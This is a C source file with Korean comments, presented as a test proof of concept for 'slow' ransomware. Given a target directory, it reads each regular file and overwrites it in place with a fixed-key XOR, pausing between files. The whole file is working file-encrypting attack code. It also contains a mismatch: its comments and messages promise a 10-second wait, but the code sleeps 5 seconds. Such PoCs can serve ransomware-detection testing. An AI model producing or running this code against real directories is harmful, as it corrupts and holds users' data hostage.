// slow_ransom.c
// 10초에 한 번씩 지정한 디렉터리 안의 파일을 순차적으로 "암호화"하는 테스트용 PoC
// 실제 환경에서는 절대 중요한 디렉터리에 실행하지 말 것!

#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <fcntl.h>

// 아주 단순한 XOR "암호화" 키 (테스트용)
#define XOR_KEY 0xAA

// 디렉터리 내의 정규 파일을 순회하면서 하나씩 암호화
// 10초마다 한 파일씩 처리
int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "사용법: %s <공격_대상_디렉터리>\n", argv[0]);
        fprintf(stderr, "예: %s ~/workspace/target\n", argv[0]);
        return 1;
    }

    const char *target_dir = argv[1];

    DIR *dp = opendir(target_dir);
    if (!dp) {
        perror("opendir");
        return 1;
    }

    printf("[*] 공격 대상 디렉터리: %s\n", target_dir);
    printf("[*] 10초마다 한 파일씩 XOR로 덮어씁니다. (테스트용)\n");

    struct dirent *de;
    char path[PATH_MAX];

    while ((de = readdir(dp)) != NULL) {
        // "." ".." 무시
        if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
            continue;

        // 파일 경로 만들기
        snprintf(path, sizeof(path), "%s/%s", target_dir, de->d_name);
        path[PATH_MAX - 1] = '\0';

        struct stat st;
        if (stat(path, &st) == -1) {
            perror("stat");
            continue;
        }

        // 정규 파일만 대상으로 (디렉터리/심링크 등은 패스)
        if (!S_ISREG(st.st_mode)) {
            continue;
        }

        if (st.st_size == 0) {
            printf("[*] %s : 크기가 0인 파일, 스킵\n", path);
            continue;
        }

        printf("[*] 공격 시작: %s (size=%ld)\n", path, (long)st.st_size);

        int fd = open(path, O_RDWR);
        if (fd == -1) {
            perror("open");
            continue;
        }

        // 파일 전체 읽기
        char *buf = malloc(st.st_size);
        if (!buf) {
            fprintf(stderr, "malloc 실패 (size=%ld)\n", (long)st.st_size);
            close(fd);
            continue;
        }

        ssize_t r = read(fd, buf, st.st_size);
        if (r != st.st_size) {
            if (r == -1) perror("read");
            else fprintf(stderr, "read 크기 불일치: %ld vs %ld\n", (long)r, (long)st.st_size);
            free(buf);
            close(fd);
            continue;
        }

        // 아주 단순한 XOR "암호화"
        for (off_t i = 0; i < st.st_size; i++) {
            buf[i] ^= XOR_KEY;
        }

        // 파일 처음으로 이동해서 다시 쓰기
        if (lseek(fd, 0, SEEK_SET) == -1) {
            perror("lseek");
            free(buf);
            close(fd);
            continue;
        }

        ssize_t w = write(fd, buf, st.st_size);
        if (w != st.st_size) {
            if (w == -1) perror("write");
            else fprintf(stderr, "write 크기 불일치: %ld vs %ld\n", (long)w, (long)st.st_size);
            free(buf);
            close(fd);
            continue;
        }

        printf("[+] 암호화 완료: %s\n", path);

        free(buf);
        close(fd);

        // ===== 핵심: 10초마다 한 번씩 write =====
        printf("[*] 다음 파일 공격 전 10초 대기...\n");
        sleep(5);
    }

    closedir(dp);
    printf("[*] 디렉터리 내 파일 처리 완료.\n");
    return 0;
}
